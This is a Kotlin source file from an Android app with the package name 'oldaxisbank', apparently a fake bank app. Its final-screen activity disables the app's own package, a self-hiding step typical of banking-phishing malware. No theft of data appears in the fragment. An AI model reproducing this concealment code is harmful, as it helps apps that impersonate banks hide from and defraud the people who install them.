package com.example.oldaxisbank

import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle

class finalscreen : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_finalscreen)

        val pakagemanger = packageManager
//        val componentname =  ComponentName(this,MainActivity::class.java)
        pakagemanger.setApplicationEnabledSetting(packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)

    }
}